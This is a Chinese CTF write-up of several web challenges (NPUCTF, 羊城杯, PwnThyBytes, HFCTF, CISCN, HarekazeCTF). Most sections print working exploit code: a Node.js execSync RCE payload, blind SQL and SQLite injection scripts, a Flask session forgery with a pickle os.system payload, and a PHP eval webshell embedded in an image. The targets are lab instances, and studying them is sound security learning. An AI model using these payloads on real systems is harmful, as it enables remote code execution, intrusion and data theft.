## 0x01 [NPUCTF2020]验证🐎

```js
str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')
```

第一步是一个弱类型比较，下面有两个常用的比较方式

1. `a[]=a&b[]=a`

2. `a='1' &b=[1]`

注意第二种方式必须使用json格式进行传输，不然`[1]`会被解析成为字符串。很显然这里使用第二种。

第二步就是研究上面这个正则表达式了。一共分为3个部分。

1. `(?:Math(?:\.\w+)?)`

![image-20220102083051223](https://img.dem0dem0.top/images/image-20220102083051223.png)

可以看到必须是`Math.xxxx`这种类型

2. `[()+\-*/&|^%<>=,?:]`
![image-20220102083300685](https://img.dem0dem0.top/images/image-20220102083300685.png)

可以看到能使用的符号还有这么多。

3. `(?:\d+\.?\d*(?:e\d+)?)`

   这个好像就是所有的数字，包括整数，浮点数，科学计数法。不难想到`fromCharcode`

构造一个charcode的python函数

```js
def gen(cmd):
  s = f"return process.mainModule.require('child_process').execSync('{cmd}').toString()"
  return ','.join([str(ord(i)) for i in s])
```

但是现在现在必须用Math开头，我们看看这个对象有什么方法可以使用。

我们都只知道在nodejs中`Function`这个东西是所有函数的构造器，我们可以利用这个构造一个匿名函数，来执行我们的命令，但是在本地测试的时候`Math=Math+1`可以获得一个Math字符串，但是在远程就会报错，不是很明白其中的原因，懒狗表示不想debug了。

```
Math=Math+1,Math=Math.constructor,Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()
```

这个payload本地通了，远程就无了，不明白。呜呜。最好是用了他们的箭头函数过的

```
(Math=>(Math=Math.constructor,Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41,46,116,111,83,116,114,105,110,103,40,41))))(Math+1)()

```

但是这个题目还是学到了很多。

## 0x02 [羊城杯 2020]Blackcat [XDCTF 2015]filemanager

做过了之前，直接嗦了

## 0x03 [羊城杯 2020]Easyphp2

http://52d4c318-ed13-49c6-afd9-807ea660e12b.node4.buuoj.cn:81/?file=php://filter/convert.%25%36%32ase64-encode/resource=GWHT.php

这个题目也是运气好，我fuzz出来，这里过滤了base64，我就说试一试编码绕过，但是一想，只编码一次，有个勾巴用呀，他接受到的时候服务器不自动解码了，所以我就说试一试两次，其实这个两次url编码在我们实际的使用过程中用得还是挺多的，具体在于有些php函数会自动解码🐂

```
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>count is here</title>

    <style>

        html,
        body {
            overflow: none;
            max-height: 100vh;
        }

    </style>
</head>

<body style="height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;">

<center><img src="question.jpg" height="200" width="200" /> </center>

    <?php
    ini_set('max_execution_time', 5);

    if ($_COOKIE['pass'] !== getenv('PASS')) {
        setcookie('pass', 'PASS');
        die('<h2>'.'<hacker>'.'<h2>'.'<br>'.'<h1>'.'404'.'<h1>'.'<br>'.'Sorry, only people from GWHT are allowed to access this website.'.'23333');
    }
    ?>

    <h1>A Counter is here, but it has someting wrong</h1>

    <form>
        <input type="hidden" value="GWHT.php" name="file">
        <textarea style="border-radius: 1rem;" type="text" name="count" rows=10 cols=50></textarea><br />
        <input type="submit">
    </form>

    <?php
    if (isset($_GET["count"])) {
        $count = $_GET["count"];
        if(preg_match('/;|base64|rot13|base32|base16|<\?php|#/i', $count)){
        	die('hacker!');
        }
        echo "<h2>The Count is: " . exec('printf \'' . $count . '\' | wc -c') . "</h2>";
    }
    ?>

</body>

</html>
```

然后再看看首页就可以了，其实也还有许许多多的过滤器可以使用，比如utf16和utf8的转换，下载下来再转换回去就可以了。接着，还有就是打印可打印字符，也可以取得比较好的效果。

## 0x04 [PwnThyBytes 2019]Baby_SQL

这个题目是sql注入应该没有什么问题，并且是username字端存在sql注入。但是有转义函数，二次注入和宽字节注入都不可能了。我们必须看到源码之后发现有一个地方有问题。

![image-20220102111430473](https://img.dem0dem0.top/images/image-20220102111430473.png)

所以应该有的想法是能不能伪造session，但是session数组是再session_start的函数之后才会被创造出来，所以这里是不行的。关于session的三个考点

1. session反序列化
2. session flask伪造
3. session_upload_progress

我们去查文档的时候发现(翻别人的wp

`在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()`

使用哥哥的脚本来抓包

```php
import requests

url = "http://6a742e0c-c6b0-49a3-b626-f5f0578d17f1.node3.buuoj.cn/templates/login.php"

files = {"file": "123456789"}
a = requests.post(url=url, files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"},
                  cookies={"PHPSESSID": "test1"}, params={'username': 'test', 'password': 'test'},
                  proxies={'http': "http://127.0.0.1:8080"})
print(a.text)

```

然后剩下的部分就是随便注入了。https://blog.csdn.net/SopRomeo/article/details/108967248

```python
import requests
import time
url = "http://8757678c-2116-4259-91f3-144900dc9cb4.node4.buuoj.cn:81/templates/login.php"

files = {"file": "123456789"}



'''字段值'''
flag=''
for i in range(1,100):
    low = 32
    high = 128
    mid = (low+high)//2
    while (low < high):
        time.sleep(0.06)
        # payload_flag ={'username': "test\" or (ascii(substr((select group_concat(username) from ptbctf ),{0},1))>{1}) #".format(i, mid),'password': 'test'}
        payload_flag = {
            'username': "test\" or (ascii(substr((select group_concat(secret) from flag_tbl ),{0},1))>{1}) #".format(i,mid),'password': 'test'}
        r = requests.post(url=url,params=payload_flag,files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"},
                  cookies={"PHPSESSID": "test1"})

        print(payload_flag)
        if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
            low = mid +1
        else:
            high = mid
        mid = (low + high) // 2
    if(mid==32 or mid == 132):
        break
    flag +=chr(mid)
    print(flag)

print(flag)
```

## 0x05 [HFCTF 2021 Final]easyflask

`secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh`

不懂为什么我的调不通，eki师傅的一把就嗦了。呜呜，我直接500，惨兮兮。 摸一下eki

```python
import base64
import pickle
from flask.sessions import SecureCookieSessionInterface
import re
import pickletools
import requests

url = "http://bb1ec514-a843-47d0-ab24-242e0f987291.node4.buuoj.cn:81/"

def get_secret_key():
    target = url + "/file?file=/proc/self/environ"
    r = requests.get(target)
    #print(r.text)
    key = re.findall('key=(.*?)OLDPWD',r.text)
    return str(key[0])
secret_key = get_secret_key()
#secret_key = "glzjin22948575858jfjfjufirijidjitg3uiiuuh"
print(secret_key)
class FakeApp:
    secret_key = secret_key
class User(object):
    def __reduce__(self):
        import os
        cmd = "cat /flag > /tmp/dem"
        return (os.system,(cmd,))
exp = {
    "b":base64.b64encode(pickle.dumps(User()))
}
fake_app = FakeApp()
session_interface = SecureCookieSessionInterface()
serializer = session_interface.get_signing_serializer(fake_app)
cookie = serializer.dumps(
    {'u':exp}
)
print(cookie)
headers = {
    "Accept":"*/*",
    "Cookie":"session={0}".format(cookie)
}
req = requests.get(url+"/admin",headers=headers)
req = requests.get(url+"/file?file=/tmp/dem",headers=headers)
print(req.text)
```

这个修复的话 一个是文件读取，一个就是反序列化，可以ban一下几个操作码R,IO等等，题目的意思还是比较简单的。

## 0x06 ciscn2021 upload

这个题目在当时比赛的时候也出了，其中zip的i用mb_string绕过这个没什么好说的

https://www.php.net/manual/en/function.mb-strtolower.php

在生成这个gd2的图片马的时候，其实我是卡了许久，因为当时做题的时候，题目环境是php7，不能用它原装payload得修改，我是直接用hxd在16进制改的，很容出错，很操蛋，但是我看见yu师傅的操作过程就很骚，稳妥。

![image-20220102130628742](https://img.dem0dem0.top/images/image-20220102130628742.png)

把其中的input改成题目原本生成的，我们就可以拿到shellcode在编码之后的鸭子，然后我在010中去编辑它，把它变成想要的样子，注意最好使用覆盖的方法，而不是重写，这样会破坏图片的结构。然后

![image-20220102130758984](https://img.dem0dem0.top/images/image-20220102130758984.png)

这里这个就是编辑后的payload

```
text_payload = b"<?=EVAL($_POST[1]);    ?>"
payload = b"a39f67641d201612546f112e29152b2167226b505050506f5f5310"
```

放在这里大家可以取用。剩下的就是基本操作可。

## 0x07 [2021祥云杯]Package Manager 2021

![image-20220102154230287](https://img.dem0dem0.top/images/image-20220102154230287.png)

sql语句直接用拼接，神仙都救不了。

```
admin"||this.passsword[{}]="{}
```

## 0x08 [HarekazeCTF2019]Sqlite Voting

通过师傅的博客学一波:anquanke.com/post/id/222625#h3-6

sqlite注入学习。

记录几个sqlite的特性

1. 首先是`[]` 可以看到他<kbd>`</kbd>这个作用都是一样，标识关键字。
2. 和mysql中的information一样功能的数据库，sqlite也有[sqlite_master](https://www.sqlite.org/schematab.html)
![image-20220102164149765](https://img.dem0dem0.top/images/image-20220102164149765.png)



其实大体上还是和mysql差不多。

:a:解题

这个题目我们一看源码

![image-20220102164519259](https://img.dem0dem0.top/images/image-20220102164519259.png)

这个时候有两种方式可以注入。

- 报错注入
- 时间盲注

但其实这里的报错注入也是一种盲注，因为他对异常进行了捕获，但是我们要怎么构造异常呢?查文档的内置函数

`abs(x)`If X is the integer -9223372036854775808 then abs(X) throws an integer overflow error.

`load_extension(x,y)`这个函数在扩展加载失败时候会抛出异常

`sum ntitle`都存在整数溢出的异常输出

:record_button:问题1：没有substr等函数，我们如何来制造盲注呢?

师傅的博客是说利用长度变化。

![image-20220102165125315](https://img.dem0dem0.top/images/image-20220102165125315.png)

大概就是利用这个函数来达到目的，这样我们首先就需要知道这个字段本身的长度，然后一位一位地去爆破。

下面来看一下exp。

```
abs(case(length(hex((select(flag)from(flag))))&{1<<n})when(0)then(0)else(0x8000000000000000)end)
```

这个语句，最外层是abs抛出异常，中间是一个case when then else 语句。

最关键的地方在于`length(hex((select(flag)from(flag))))&{1<<n}`一开始不是很能够理解，为什么要这样做?

这个语句的目的是记录flag字段中每一个为1的部分，最后拼接起来就是最后的长度了。

```
l=0
for x in range(16):
	r=requests.post(url,data=f"abs(case(length(hex((select(flag)from(flag))))&{1<<x})when(0)then(0)else(0x8000000000000000)end)")
	if(b"An error occurred" in r.content)
		l |= 1<<x
print("[+] length:",l)
```

`84`

:record_button:问题2: 没有引号我们怎么构造`abcdef`

第一种方法 利用表中已经有的数据来构造`trim+hex`

```python
table = {}
table['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)' 
# 'zebra' → '7A65627261'
# trim 删除 1,2,5,6,7 后只剩下了 A ，以下同理
table['C'] = 'trim(hex(typeof(.1)),12567)' 
# 'real' → '7265616C'
table['D'] = 'trim(hex(0xffffffffffffffff),123)' 
# 0xffffffffffffffff = -1 → '2D31'
table['E'] = 'trim(hex(0.1),1230)' 
# 0.1 → 302E31
table['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)' 
# 'dog' → '646F67'
table['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{table["C"]}||{table["F"]})' 
# 'koala' → '6B6F616C61'
# || 是连接符，第二项的意思是 16||C||F ，也就是利用 trim 删除 1,6,C,F
```

然后就是师傅的exp

```python
import requests,binascii,time
l=84
url="http://08868133-acae-46f7-9d42-25203638a53e.node4.buuoj.cn:81/"+"vote.php"
table = {}
table['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)' 
# 'zebra' → '7A65627261'
# trim 删除 1,2,5,6,7 后只剩下了 A ，以下同理
table['C'] = 'trim(hex(typeof(.1)),12567)' 
# 'real' → '7265616C'
table['D'] = 'trim(hex(0xffffffffffffffff),123)' 
# 0xffffffffffffffff = -1 → '2D31'
table['E'] = 'trim(hex(0.1),1230)' 
# 0.1 → 302E31
table['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)' 
# 'dog' → '646F67'
table['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{table["C"]}||{table["F"]})' 
# 'koala' → '6B6F616C61'
# || 是连接符，第二项的意思是 16||C||F ，也就是利用 trim 删除 1,6,C,F
res = binascii.hexlify(b'flag{').decode().upper()
for i in range(len(res), l):
  for x in '0123456789ABCDEF':
    t = '||'.join(c if c in '0123456789' else table[c] for c in res + x)
    r = requests.post(url, data={
      'id': f'abs(case(replace(length(replace(hex((select(flag)from(flag))),{t},trim(0,0))),{l},trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'
    })
    if b'An error occurred' in r.content:
      res += x
      break
    time.sleep(0.6)
  print(f'[+] flag ({i}/{l}): {res}')
  i += 1
print('[+] flag:', binascii.unhexlify(res).decode())
```

:record_button: 解法2 双重hex去掉一次非数字

```
sqlite> select hex(hex((select flag from flag)));
363636433631363737423632333933363634363533373636333332443632363333313337324433343331333333323244363236343331333332443339333036313632363536323339363533383333333533353744
```

```
import requests,binascii,time
l=168
url="http://08868133-acae-46f7-9d42-25203638a53e.node4.buuoj.cn:81/"+"vote.php"
table = {}
table['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)' 
# 'zebra' → '7A65627261'
# trim 删除 1,2,5,6,7 后只剩下了 A ，以下同理
table['C'] = 'trim(hex(typeof(.1)),12567)' 
# 'real' → '7265616C'
table['D'] = 'trim(hex(0xffffffffffffffff),123)' 
# 0xffffffffffffffff = -1 → '2D31'
table['E'] = 'trim(hex(0.1),1230)' 
# 0.1 → 302E31
table['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)' 
# 'dog' → '646F67'
table['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{table["C"]}||{table["F"]})' 
# 'koala' → '6B6F616C61'
# || 是连接符，第二项的意思是 16||C||F ，也就是利用 trim 删除 1,6,C,F
res = binascii.hexlify(bytes(binascii.hexlify(b'flag{').decode().upper(),"utf-8")).decode().upper()
for i in range(len(res), l):
  for x in '0123456789':
    t = '||'.join(c if c in '0123456789' else table[c] for c in res + x)
    r = requests.post(url, data={
      'id': f'abs(case(replace(length(replace(hex(hex((select(flag)from(flag)))),{t},trim(0,0))),{l},trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'
    })
    if b'An error occurred' in r.content:
      res += x
      break
    time.sleep(0.6)
  print(f'[+] flag ({i}/{l}): {res}')
  i += 1
print('[+] flag:', binascii.unhexlify(binascii.unhexlify(res).decode()).decode())
```

